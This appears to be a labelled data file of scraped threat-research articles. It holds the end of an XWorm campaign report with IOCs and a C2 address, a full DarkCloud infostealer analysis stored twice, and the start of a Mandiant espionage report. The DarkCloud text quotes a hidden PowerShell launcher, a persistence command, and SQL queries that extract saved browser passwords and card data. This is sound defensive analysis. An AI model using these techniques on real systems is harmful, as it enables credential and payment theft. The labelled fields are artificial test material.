investigation, we discovered that the GitHub repository hosting the malicious code contained not only two files directly observed in the attack chain, but in fact it hosted 11 files in total and was also created only a week prior to the observed malicious activities. All the files, which were disguised as text files, contained a highly obfuscated Python code that was ultimately encoded with base64. To better understand this campaign, the SpiderLabs team analyzed the files from the public repository referenced in the described attack chain. Extracted strings show that most of the files share the same behavior patterns where they implement a persistence mechanism via a registry key. The name of the value implemented in the registry varies but always tries to mimic legitimate system operation. Names like: UpdateWins WindowsSecurity were observed. Additionally, files located in this repository can be divided into two groups. The first is responsible for creating persistence. They are also responsible for downloading and injecting files from the second group into legitimate processes. Files from the second group serve as a final payload and are more complex. These contain multiple execution layers and their behavior and content attribute them to a commonly known yet still evolving malware-as-a-service RAT \u2014 XWorm. During binary analysis, the SpiderLabs team was also able to extract a command-and-control (C2) IP used in one of the final payload scripts (\u201cExppiyt.txt\u201d). The IP extracted is 5[.]181[.]165[.]102:7705 and at the time of analysis was not recognized as malicious on VirusTotal. Figure 9. VirusTotal search result for the supposed C2 IP extracted from the binary injected during the attack chain. Summary: The observed activities reflect a broader and increasingly sophisticated trend among threat actors: leveraging AI-related branding and repurposing legitimate remote access tools to distribute commodity malware. This particular campaign, uncovered by the SpiderLabs Threat Hunt Team, demonstrates how attackers are exploiting people\u2019s current fascination with AI to enhance the credibility and appeal of their social engineering tactics. Adversaries can bypass traditional detection mechanisms and infiltrate target environments with alarming efficiency. What sets this investigation apart is not just the technical findings, but the methodology behind them. This was a hunt-driven investigation, powered by human-led analysis \u2014 a critical component in identifying threats that evade automated systems. While machine learning and automated detection play a vital role in modern cybersecurity, they are not infallible. Sophisticated adversaries are increasingly designing campaigns to slip past these defenses, making expert-driven threat hunting more essential than ever. The SpiderLabs Threat Hunt Team\u2019s findings prove the value of proactive, human-centric threat analysis. It also reinforces the strategic importance of investing in skilled threat hunters who can think like adversaries, adapt to evolving tradecraft, and uncover hidden threats before they cause damage. In an era where attackers are constantly innovating, SpiderLabs\u2019 threat hunting provides organizations with a crucial advantage \u2014 combining deep technical expertise with investigative rigor to stay ahead of the curve. Their work not only protects clients from immediate threats but also contributes to the broader cybersecurity community by exposing emerging tactics and techniques. Appendix \u2013 Indicators of compromise: URLs hxxps://gptgrok[.]ai hxxps://anhemvn6[.]com hxxps://anhemvn4[.]com/5btc[.]zip hxxps://github[.]com/trieule99911/vianhthuongbtc h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/basse64.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/backpuppure.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/abcdegia.txt h xxps://raw.githu busercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/Nhwneafyp.txt h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/Hzcbmqnqwlv.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/Exppiyt.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/x-metavn.txt h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/purecoookielog.txt h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/exepurelog.txt h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/cccccccccccccccccccccccc.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/buquabua.txt C2 IP: 5[.]181[.]165[.]102[:]7705 Share: Copy Link Link Copied v2 LinkedIn X Facebook Stay Informed Sign up to receive the latest security news and trends straight to your inbox from LevelBlue. Stay Informed: Subscribe Stay Informed Sign up to receive the latest security news and trends straight to your inbox from LevelBlue. RESEARCH REPORT 2025 LevelBlue Threat Trends Report, Edition Two WEBINAR Fool Me Once: How Cybercriminals are Perfecting Deception ABOUT LEVELBLUE LevelBlue is a globally recognized cybersecurity leader that reduces cyber risk and fortifies organizations against disruptive and damaging cyber threats. Our comprehensive offensive and defensive cybersecurity portfolio detects what others cannot, responds with greater speed and effectiveness, optimizes client investment, and improves security resilience. Learn more about us . Artificial Intelligence Threat Hunting Latest Intelligence Stealerium Unmasked: Inside a Multi-Lure, Multi-Stage Stealer Campaign Notepad-Plus Fuss: Notepad++ Supply Chain Attack Analysis 19 Shades of LockBit5.0, Inside the Latest Cross-Platform Ransomware\u2019s Newest Leaked Samples: Part 3 Related Offerings Penetration Testing Incident Readiness and Response Cyber Threat Intelligence Threat Hunting Discover how our specialists can tailor a security program to fit the needs of your organization. Request a Demo Stay Informed Sign up to receive the latest security news and trends straight to your inbox from LevelBlue. Leadership Our History Press Releases Media Coverage Careers Contact View All Services Free Trials Training & Certification Support Success Center Documentation Center Legal Terms of Usage Privacy Policy Your Privacy Choices \u00a9 Copyright 2026",
    "expected_count": 3
  },
  {
    "url": "https://www.fortinet.com/blog/threat-research/unveiling-a-new-variant-of-the-darkcloud-campaign",
    "title": "Unveiling a New Variant of the DarkCloud Campaign | FortiGuard Labs",
    "content": "Unveiling a New Variant of the DarkCloud Campaign | FortiGuard Labs Blog Products & Solutions Secure Networking Unified SASE Cloud Security Security Operations Operational Technology Security Architecture Threat Research Threat Research PSIRT Thought Leadership CISO Collective Industry Trends Corporate Fortinet News & Updates Partners Customer Success Stories Life at Fortinet FortiGuard Labs Threat Research Unveiling a New Variant of the DarkCloud Campaign Fileless DarkCloud Variant Uses PowerShell and VB6 Payloads to Evade Detection FortiGuard Security Portfolio 2025 Threat Landscape Report By Xiaopeng Zhang | August 07, 2025 Article Contents By Xiaopeng Zhang | August 07, 2025 Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Collect sensitive information from the victim\u2019s computer Severity level: High Background In early July 2025, a new DarkCloud campaign was observed in the wild by Fortinet\u2019s FortiGuard Labs team. It began with a phishing email containing an attached RAR archive. I subsequently investigated this campaign and conducted a step-by-step analysis. DarkCloud is a known stealthy Windows-based information-stealer malware that was first identified in 2022. It is designed to steal sensitive information from the victim\u2019s computer, including saved login credentials, financial data, contacts, and more. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Download Now In this analysis, I will show how the campaign initiates on the victim\u2019s computer, how it establishes persistence on the system, how it downloads, decodes, and deploys the fileless DarkCloud payload, the types of sensitive information this variant can harvest from the victim, and how the stolen data is exfiltrated. Infection Chain Figure 1 shows the infection chain of this new DarkCloud variant. Figure 1: New DarkCloud variant infection chain. Initialization of Phishing Email Attack The phishing email, shown in Figure 2, lures recipients into opening an attached RAR file under the pretext of providing an urgent quote. Notably, the email contains no message body. Only an attachment is included. Figure 2: The phishing email with a RAR attachment. Upon opening the Quote #S_260627.RAR file in WinRAR, the recipient finds a standalone JavaScript file named Quote #S_260627.js inside. Once the recipient double-clicks on the JS file, a Windows default process, WScript.exe, is automatically launched to execute it. JavaScript & PowerShell The JS code is obfuscated, as shown in Figure 3. When being executed, it dynamically decodes a piece of PowerShell code from the obfuscated code. It then creates a WScript.Shell object to run the decoded PowerShell code. Figure 3: Partial code of the JavaScript file. The cosmea variable holds a decoded string, powershell -w hidden -noprofile -ep bypass -c, while the effortless variable contains the decoded PowerShell code. The PowerShell code is Base64-encoded and gets decoded at runtime. Figure 4 shows the decoded PowerShell code, which is split into multiple parts. Figure 4: Base64-decoded PowerShell code. It downloads a disguised JPEG picture, shown in Figure 5. Figure 5: View of the disguised JPEG file. According to my analysis, an encrypted .NET DLL is embedded in the background of this JPEG picture. The PowerShell code then locates the .NET DLL by parsing the JPEG file and loads it using the [Reflection.Assembly]::Load() method and then calls the ClassLibrary1.Home.VAI() method by calling the Invoke() method with an array of parameters carried by the $florinda variable. Dissecting the .NET Module The Assembly Name of the .NET DLL is Microsoft.Win32.TaskScheduler. The .NET DLL is disguised as a TaskScheduler-related module, likely intended to confuse both the victim and researchers. Figure 6 displays a debugger view paused at the entry point function VAI()of the .NET DLL. Figure 6: Viewing the VAI() method in a debugger. The .NET DLL module performs tasks such as maintaining persistence, downloading and decoding the fileless DarkCloud payload, and deploying the payload in a Windows process using process hollowing. Persistence Mechanism The module copies the JavaScript file to another location by executing this command line: cmd.exe /C copy *.js C:\\Users\\Public\\Downloads\\edriophthalma.js. The target folder path and file name are passed by the PowerShell code. It continues to add an auto-run entry to the system registry under HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, as shown in Figure 7. Figure 7: The auto-run item added to the system registry. This ensures the copied edriophthalma.js file being executed automatically at system startup. Payload Download As you may have noticed, the first parameter of the VAI() method is a reversed Base64-encoded string (refer to Figure 6). The .NET module decodes the Base64 string into a URL as hxxp://paste[.]ee/d/0WhDakVP/0. By requesting the URL, a reversed PE file can be retrieved in the response, as illustrated in Figure 8. Figure 8: Reversed DarkCloud payload. After reversing and converting its content from a hex string to binary, an EXE file will be present in memory, which serves as the fileless payload of this DarkCloud variant. Deploy DarkCloud Payload with Process Hollowing It searches for the MSBuild.exe file in the relevant .NET Framework directories on the victim\u2019s system. The file name is passed by the PowerShell code (see Figure 6 for more information). In my environment, it is %Windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe. Figure 9: Partial list of Windows APIs used for process hollowing. It then performs process hollowing on the newly created MSBuild.exe process. To accomplish this, it must call a series of Window APIs, such as those defined in Figure 9. The steps involved are as follows: It newly creates a suspended MSBuild.exe process. It copies and deploys the DarkCloud payload into the new process. It modifies the EAX register value to point to the entry point of the DarkCloud. It resumes the suspended process, allowing the DarkCloud to run inside the new MSBuild.exe process. The relevant APIs called are: CreateProcess(), ReadProcessMemory(),VirtualAllocEx(), NtUnmapViewOfSection(), WriteProcessMemory(), GetThreadContext(), SetThreadContext(), and ResumeThread(). A Closer Look at the DarkCloud Payload The DarkCloud payload is written in Microsoft Visual Basic 6. By analyzing it with the VB Decompiler, we can examine the code structure of DarkCloud, as shown in Figure 10. Figure 10: The DarkCloud code structure. As you can see, the DarkCloud variant contains a Form with multiple Timers attached. In Visual Basic (VB), a Timer is a control or object that repeatedly executes a specified timer function at specified time intervals. According to my analysis, Timer4 is the primary worker timer, whose function is called every 150 milliseconds. Anti-Analysis Technology Encrypted Constant Strings To hinder analysis by security researchers, DarkCloud encrypts most of its constant strings. There are more than 600 encrypted constant strings throughout this payload file, which are decrypted dynamically at runtime. Figure 11 shows an example of decrypting the Unicode constant string VBScript.RegExp. Figure 11: Decrypted constant strings. Anti-Sandbox In Timer4\u2019s timer function, there is a mechanism to evade automated analysis systems, like sandboxes. It examines whether a real user is interacting with the computer by monitoring the status of the mouse and keyboard activities. The malware calls the GetAsyncKeyState() API to check the status of the keys. If any key or mouse button is pressed, it returns 0x8001. DarkCloud repeatedly calls the API and checks its result until it detects that a key has been pressed, as shown in Figure 12. On the other hand, the malware remains idle if no mouse and keyboard activity occurs. Figure 12: Code snippet for checking the victim\u2019s input event. Collecting Sensitive Information Basic information: DarkCloud retrieves the Computer Name and Username from the compromised system by calling the rtcEnvironVar() API. It also obtains the victim\u2019s public IP address by sending a request to http://showip.NET. Credentials and Payment Information The malware harvests saved credentials and payment information from some popular web browsers. Figure 13: Browser profile paths. DarkCloud traverses the profile paths of the browsers listed in Figure 13 to access sensitive data stored in the Login Data and WebData data files. Both of them are saved in SQLite3 database format. It executes two SQL queries, which are decrypted constant strings, to retrieve the data for the logins and credit_cards tables SELECT origin_url, username_value, password_value FROM logins SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards It utilizes relevant SQLite APIs, such as sqlite3_prepare_v2(), sqlite3_column_text(), and sqlite3_column_blob(), to extract sensitive data. Some of the retrieved data, like saved passwords, is encrypted. DarkCloud drops and executes another EXE file that extracts the decryption key. It enables the malware to decrypt these passwords with the decryption key. All collected sensitive data is written into a local text file (see Figure 14), which is later submitted to the attacker. Figure 14: Example of credentials and payment information collected from Chrome. Besides web browsers, DarkCloud can also collect credentials from email clients, FTP clients, and sensitive data stored in the following profile folders. %AppData%\\Adobe %AppData%\\dnSpy %AppData%\\FileZilla %AppData%\\IDMComp %AppData%\\Mozilla %AppData%\\SweetScape %AppData%\\Wireshark Relevant software list: Google Chrome, Microsoft Edge (and Edge-based Browsers), Mozilla Firefox, Brave Browser, FoxMail, eM Client, Microsoft Outlook, CoreFTP, WinSCP, Adobe, dnSpy, FileZilla, IDMComp, Mozilla, SweetScape, and Wireshark. Email Contacts: DarkCloud has the capability to retrieve the victim\u2019s email contacts from multiple email clients installed on the compromised computer. Like the credentials, the harvested email contacts are saved in local text files. The following text files (they are also decrypted constant strings) correspond to each email client and are submitted to the attacker. ThunderBirdContacts.txt 163MailContacts.txt EMClient10Contacts.txt OutlookContacts.txt Email clients list : Mozilla Thunderbird, NetEase MailMaster, eM Client, and Microsoft Outlook. Submission over SMTP DarkCloud supports both FTP and SMTP protocols to exfiltrate collected data to the attacker. This variant uses the SMTP protocol. All the relevant strings, including SMTP server domain, login email account and password, and recipient email address, are decrypted constant strings. Figure 15: Malware about to send collected data over SMTP. Figure 15 shows an example of DarkCloud submitting collected credentials and payment information as a text file attachment in an email. DarkCloud uses the same method to submit collected email contacts to the attacker. The email subject contains basic information from the victim\u2019s system, including the computer name, username, and public IPv4 address, which is shown at the bottom of Figure 15. Figure 16 presents a screenshot of the SMTP traffic generated when transmitting the text file containing the collected credentials and payment information. Figure 16: Collected data sent via SMTP over TLS. Conclusion In this analysis, we examined a new DarkCloud campaign discovered by Fortinet\u2019s FortiGuard Labs. The campaign begins with a phishing email containing a malicious RAR archive that lures the recipient into executing a JavaScript file within the attached RAR archive. This script decodes and launches PowerShell code, then loads an encrypted, fileless .NET DLL masquerading as a legitimate Task Scheduler module. The .NET DLL establishes persistence, downloads and reverses a payload from a remote URL, and uses process hollowing to inject the final DarkCloud payload into MSBuild.exe. The payload, written in VB6, performs anti-analysis checks by monitoring keyboard and mouse activity to evade sandbox detection. The analysis also focuses on what sensitive information the malware collects from the compromised system, such as credentials, payment information stored in web browsers, FTP clients, and email clients. It also collects the email contacts from the victim\u2019s email client software. Finally, I explained how the collected data saved in text files is submitted to the attacker via the SMTP protocol. Fortinet Protections Fortinet customers are already protected from this campaign with FortiGuard\u2019s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URL downloading the image file and DarkCloud payload are rated as \u201c Malicious Websites \u201d by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as \u201cvirus detected.\u201d In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet\u2019s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard Antivirus service detects the malicious JS file, the fileless DarkCloud payload file with the following AV signatures. JS/DarkCloud.ACVJ!tr W32/DarkCloud.QU!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you can sign up to receive future alerts. We also suggest our readers go through the free NSE training : NSE 1 \u2013 Information Security Awareness , a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team . IOCs: URLs: hxxps://archive[.]org/download/universe-1733359315202-8750/universe-1733359315202-8750.jpg hxxp://paste[.]ee/d/0WhDakVP/0 Relevant Sample SHA-256: [Quote #$_260627.js] 381AA445E173341F39E464E4F79B89C9ED058631BCBBB2792D9ECBDF9FFE027D [DarkCloud payload] 82BA4340BE2E07BB74347ADE0B7B43F12CF8503A8FA535F154D2E228EFBEF69C Related Posts Threat Research Havoc: SharePoint with Microsoft Graph API turns into FUD C2 Threat Research Fortinet Identifies Malicious Packages in the Wild: Insights and Trends from November 2024 Onward Threat Research Analyzing ELF/Sshdinjector.A!tr with a Human and Artificial Analyst News & Articles News Releases News Articles Security Research Threat Research FortiGuard Labs Threat Map Ransomware Prevention Connect With Us Fortinet Community Partner Portal Investor Relations Product Certifications Company About Us Exec Mgmt Careers Training Events Industry Awards Social Responsibility CyberGlossary Sitemap Blog Sitemap Copyright \u00a9 2026 Fortinet, Inc. All Rights Reserved Terms of Services Privacy Policy | Cookie Settings Also of Interest: Insights on TorrentLocker New Variant of QakBot Being Spread by HTML... Notable Droppers Emerge in Recent Threat Campaigns Horabot Unleashed: A Stealthy Phishing Threat",
    "filtered_content": "Unveiling a New Variant of the DarkCloud Campaign | FortiGuard Labs Blog Products & Solutions Secure Networking Unified SASE Cloud Security Security Operations Operational Technology Security Architecture Threat Research Threat Research PSIRT Thought Leadership CISO Collective Industry Trends Corporate Fortinet News & Updates Partners Customer Success Stories Life at Fortinet FortiGuard Labs Threat Research Unveiling a New Variant of the DarkCloud Campaign Fileless DarkCloud Variant Uses PowerShell and VB6 Payloads to Evade Detection FortiGuard Security Portfolio 2025 Threat Landscape Report By Xiaopeng Zhang | August 07, 2025 Article Contents By Xiaopeng Zhang | August 07, 2025 Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Collect sensitive information from the victim\u2019s computer Severity level: High Background In early July 2025, a new DarkCloud campaign was observed in the wild by Fortinet\u2019s FortiGuard Labs team. It began with a phishing email containing an attached RAR archive. I subsequently investigated this campaign and conducted a step-by-step analysis. DarkCloud is a known stealthy Windows-based information-stealer malware that was first identified in 2022. It is designed to steal sensitive information from the victim\u2019s computer, including saved login credentials, financial data, contacts, and more. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Download Now In this analysis, I will show how the campaign initiates on the victim\u2019s computer, how it establishes persistence on the system, how it downloads, decodes, and deploys the fileless DarkCloud payload, the types of sensitive information this variant can harvest from the victim, and how the stolen data is exfiltrated. Infection Chain Figure 1 shows the infection chain of this new DarkCloud variant. Figure 1: New DarkCloud variant infection chain. Initialization of Phishing Email Attack The phishing email, shown in Figure 2, lures recipients into opening an attached RAR file under the pretext of providing an urgent quote. Notably, the email contains no message body. Only an attachment is included. Figure 2: The phishing email with a RAR attachment. Upon opening the Quote #S_260627.RAR file in WinRAR, the recipient finds a standalone JavaScript file named Quote #S_260627.js inside. Once the recipient double-clicks on the JS file, a Windows default process, WScript.exe, is automatically launched to execute it. JavaScript & PowerShell The JS code is obfuscated, as shown in Figure 3. When being executed, it dynamically decodes a piece of PowerShell code from the obfuscated code. It then creates a WScript.Shell object to run the decoded PowerShell code. Figure 3: Partial code of the JavaScript file. The cosmea variable holds a decoded string, powershell -w hidden -noprofile -ep bypass -c, while the effortless variable contains the decoded PowerShell code. The PowerShell code is Base64-encoded and gets decoded at runtime. Figure 4 shows the decoded PowerShell code, which is split into multiple parts. Figure 4: Base64-decoded PowerShell code. It downloads a disguised JPEG picture, shown in Figure 5. Figure 5: View of the disguised JPEG file. According to my analysis, an encrypted .NET DLL is embedded in the background of this JPEG picture. The PowerShell code then locates the .NET DLL by parsing the JPEG file and loads it using the [Reflection.Assembly]::Load() method and then calls the ClassLibrary1.Home.VAI() method by calling the Invoke() method with an array of parameters carried by the $florinda variable. Dissecting the .NET Module The Assembly Name of the .NET DLL is Microsoft.Win32.TaskScheduler. The .NET DLL is disguised as a TaskScheduler-related module, likely intended to confuse both the victim and researchers. Figure 6 displays a debugger view paused at the entry point function VAI()of the .NET DLL. Figure 6: Viewing the VAI() method in a debugger. The .NET DLL module performs tasks such as maintaining persistence, downloading and decoding the fileless DarkCloud payload, and deploying the payload in a Windows process using process hollowing. Persistence Mechanism The module copies the JavaScript file to another location by executing this command line: cmd.exe /C copy *.js C:\\Users\\Public\\Downloads\\edriophthalma.js. The target folder path and file name are passed by the PowerShell code. It continues to add an auto-run entry to the system registry under HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, as shown in Figure 7. Figure 7: The auto-run item added to the system registry. This ensures the copied edriophthalma.js file being executed automatically at system startup. Payload Download As you may have noticed, the first parameter of the VAI() method is a reversed Base64-encoded string (refer to Figure 6). The .NET module decodes the Base64 string into a URL as hxxp://paste[.]ee/d/0WhDakVP/0. By requesting the URL, a reversed PE file can be retrieved in the response, as illustrated in Figure 8. Figure 8: Reversed DarkCloud payload. After reversing and converting its content from a hex string to binary, an EXE file will be present in memory, which serves as the fileless payload of this DarkCloud variant. Deploy DarkCloud Payload with Process Hollowing It searches for the MSBuild.exe file in the relevant .NET Framework directories on the victim\u2019s system. The file name is passed by the PowerShell code (see Figure 6 for more information). In my environment, it is %Windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe. Figure 9: Partial list of Windows APIs used for process hollowing. It then performs process hollowing on the newly created MSBuild.exe process. To accomplish this, it must call a series of Window APIs, such as those defined in Figure 9. The steps involved are as follows: It newly creates a suspended MSBuild.exe process. It copies and deploys the DarkCloud payload into the new process. It modifies the EAX register value to point to the entry point of the DarkCloud. It resumes the suspended process, allowing the DarkCloud to run inside the new MSBuild.exe process. The relevant APIs called are: CreateProcess(), ReadProcessMemory(),VirtualAllocEx(), NtUnmapViewOfSection(), WriteProcessMemory(), GetThreadContext(), SetThreadContext(), and ResumeThread(). A Closer Look at the DarkCloud Payload The DarkCloud payload is written in Microsoft Visual Basic 6. By analyzing it with the VB Decompiler, we can examine the code structure of DarkCloud, as shown in Figure 10. Figure 10: The DarkCloud code structure. As you can see, the DarkCloud variant contains a Form with multiple Timers attached. In Visual Basic (VB), a Timer is a control or object that repeatedly executes a specified timer function at specified time intervals. According to my analysis, Timer4 is the primary worker timer, whose function is called every 150 milliseconds. Anti-Analysis Technology Encrypted Constant Strings To hinder analysis by security researchers, DarkCloud encrypts most of its constant strings. There are more than 600 encrypted constant strings throughout this payload file, which are decrypted dynamically at runtime. Figure 11 shows an example of decrypting the Unicode constant string VBScript.RegExp. Figure 11: Decrypted constant strings. Anti-Sandbox In Timer4\u2019s timer function, there is a mechanism to evade automated analysis systems, like sandboxes. It examines whether a real user is interacting with the computer by monitoring the status of the mouse and keyboard activities. The malware calls the GetAsyncKeyState() API to check the status of the keys. If any key or mouse button is pressed, it returns 0x8001. DarkCloud repeatedly calls the API and checks its result until it detects that a key has been pressed, as shown in Figure 12. On the other hand, the malware remains idle if no mouse and keyboard activity occurs. Figure 12: Code snippet for checking the victim\u2019s input event. Collecting Sensitive Information Basic information: DarkCloud retrieves the Computer Name and Username from the compromised system by calling the rtcEnvironVar() API. It also obtains the victim\u2019s public IP address by sending a request to http://showip.NET. Credentials and Payment Information The malware harvests saved credentials and payment information from some popular web browsers. Figure 13: Browser profile paths. DarkCloud traverses the profile paths of the browsers listed in Figure 13 to access sensitive data stored in the Login Data and WebData data files. Both of them are saved in SQLite3 database format. It executes two SQL queries, which are decrypted constant strings, to retrieve the data for the logins and credit_cards tables SELECT origin_url, username_value, password_value FROM logins SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards It utilizes relevant SQLite APIs, such as sqlite3_prepare_v2(), sqlite3_column_text(), and sqlite3_column_blob(), to extract sensitive data. Some of the retrieved data, like saved passwords, is encrypted. DarkCloud drops and executes another EXE file that extracts the decryption key. It enables the malware to decrypt these passwords with the decryption key. All collected sensitive data is written into a local text file (see Figure 14), which is later submitted to the attacker. Figure 14: Example of credentials and payment information collected from Chrome. Besides web browsers, DarkCloud can also collect credentials from email clients, FTP clients, and sensitive data stored in the following profile folders. %AppData%\\Adobe %AppData%\\dnSpy %AppData%\\FileZilla %AppData%\\IDMComp %AppData%\\Mozilla %AppData%\\SweetScape %AppData%\\Wireshark Relevant software list: Google Chrome, Microsoft Edge (and Edge-based Browsers), Mozilla Firefox, Brave Browser, FoxMail, eM Client, Microsoft Outlook, CoreFTP, WinSCP, Adobe, dnSpy, FileZilla, IDMComp, Mozilla, SweetScape, and Wireshark. Email Contacts: DarkCloud has the capability to retrieve the victim\u2019s email contacts from multiple email clients installed on the compromised computer. Like the credentials, the harvested email contacts are saved in local text files. The following text files (they are also decrypted constant strings) correspond to each email client and are submitted to the attacker. ThunderBirdContacts.txt 163MailContacts.txt EMClient10Contacts.txt OutlookContacts.txt Email clients list : Mozilla Thunderbird, NetEase MailMaster, eM Client, and Microsoft Outlook. Submission over SMTP DarkCloud supports both FTP and SMTP protocols to exfiltrate collected data to the attacker. This variant uses the SMTP protocol. All the relevant strings, including SMTP server domain, login email account and password, and recipient email address, are decrypted constant strings. Figure 15: Malware about to send collected data over SMTP. Figure 15 shows an example of DarkCloud submitting collected credentials and payment information as a text file attachment in an email. DarkCloud uses the same method to submit collected email contacts to the attacker. The email subject contains basic information from the victim\u2019s system, including the computer name, username, and public IPv4 address, which is shown at the bottom of Figure 15. Figure 16 presents a screenshot of the SMTP traffic generated when transmitting the text file containing the collected credentials and payment information. Figure 16: Collected data sent via SMTP over TLS. Conclusion In this analysis, we examined a new DarkCloud campaign discovered by Fortinet\u2019s FortiGuard Labs. The campaign begins with a phishing email containing a malicious RAR archive that lures the recipient into executing a JavaScript file within the attached RAR archive. This script decodes and launches PowerShell code, then loads an encrypted, fileless .NET DLL masquerading as a legitimate Task Scheduler module. The .NET DLL establishes persistence, downloads and reverses a payload from a remote URL, and uses process hollowing to inject the final DarkCloud payload into MSBuild.exe. The payload, written in VB6, performs anti-analysis checks by monitoring keyboard and mouse activity to evade sandbox detection. The analysis also focuses on what sensitive information the malware collects from the compromised system, such as credentials, payment information stored in web browsers, FTP clients, and email clients. It also collects the email contacts from the victim\u2019s email client software. Finally, I explained how the collected data saved in text files is submitted to the attacker via the SMTP protocol. Fortinet Protections Fortinet customers are already protected from this campaign with FortiGuard\u2019s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URL downloading the image file and DarkCloud payload are rated as \u201c Malicious Websites \u201d by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as \u201cvirus detected.\u201d In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet\u2019s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard Antivirus service detects the malicious JS file, the fileless DarkCloud payload file with the following AV signatures. JS/DarkCloud.ACVJ!tr W32/DarkCloud.QU!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you can sign up to receive future alerts. We also suggest our readers go through the free NSE training : NSE 1 \u2013 Information Security Awareness , a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team . IOCs: URLs: hxxps://archive[.]org/download/universe-1733359315202-8750/universe-1733359315202-8750.jpg hxxp://paste[.]ee/d/0WhDakVP/0 Relevant Sample SHA-256: [Quote #$_260627.js] 381AA445E173341F39E464E4F79B89C9ED058631BCBBB2792D9ECBDF9FFE027D [DarkCloud payload] 82BA4340BE2E07BB74347ADE0B7B43F12CF8503A8FA535F154D2E228EFBEF69C Related Posts Threat Research Havoc: SharePoint with Microsoft Graph API turns into FUD C2 Threat Research Fortinet Identifies Malicious Packages in the Wild: Insights and Trends from November 2024 Onward Threat Research Analyzing ELF/Sshdinjector.A!tr with a Human and Artificial Analyst News & Articles News Releases News Articles Security Research Threat Research FortiGuard Labs Threat Map Ransomware Prevention Connect With Us Fortinet Community Partner Portal Investor Relations Product Certifications Company About Us Exec Mgmt Careers Training Events Industry Awards Social Responsibility CyberGlossary Sitemap Blog Sitemap Copyright \u00a9 2026 Fortinet, Inc. All Rights Reserved Terms of Services Privacy Policy | Cookie Settings Also of Interest: Insights on TorrentLocker New Variant of QakBot Being Spread by HTML... Notable Droppers Emerge in Recent Threat Campaigns Horabot Unleashed: A Stealthy Phishing Threat",
    "expected_count": 1
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense",
    "title": "Frontline Intelligence: Analysis of UNC1549 TTPs, Custom Tools, and Malware Targeting the Aerospace and Defense Ecosystem | Google Cloud Blog",
    "content": "Frontline Intelligence: Analysis of UNC1549 TTPs, Custom Tools, and Malware Targeting the Aerospace and Defense Ecosystem | Google Cloud Blog Jump to Content Cloud Blog Contact sales Get started for free Cloud Blog Solutions & technology AI & Machine Learning API Management Application Development Application Modernization Chrome Enterprise Compute Containers & Kubernetes Data Analytics Databases DevOps & SRE Maps & Geospatial Security Security & Identity Threat Intelligence Infrastructure Infrastructure Modernization Networking Productivity & Collaboration SAP on Google Cloud Storage & Data Transfer Sustainability Ecosystem IT Leaders Industries Financial Services Healthcare & Life Sciences Manufacturing Media & Entertainment Public Sector Retail Supply Chain Telecommunications Partners Startups & SMB Training & Certifications Inside Google Cloud Google Cloud Next & Events Google Cloud Consulting Google Maps Platform Google Workspace Developers & Practitioners Transform with Google Cloud Contact sales Get started for free Threat Intelligence Frontline Intelligence: Analysis of UNC1549 TTPs, Custom Tools, and Malware Targeting the Aerospace and Defense Ecosystem November 17, 2025 Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Written by: Mohamed El-Banna, Daniel Lee, Mike Stokkel, Josh Goddard Overview Last year, Mandiant published a blog post highlighting suspected Iran-nexus espionage activity targeting the aerospace, aviation, and defense industries in the Middle East. In this follow-up post, Mandiant discusses additional tactics, techniques, and procedures (TTPs) observed in incidents Mandiant has responded to. Since mid-2024, Mandiant has responded to targeted campaigns by the threat group UNC1549 against the aerospace, aviation and defense industries. To gain initial access into these environments, UNC1549 employed a dual approach: deploying well-crafted phishing campaigns designed to steal credentials or deliver malware and exploiting trusted connections with third-party suppliers and partners. The latter technique is particularly strategic when targeting organizations with high security maturity, such as defense contractors. While these primary targets often invest heavily in robust defenses, their third-party partners may possess less stringent security postures. This disparity provides 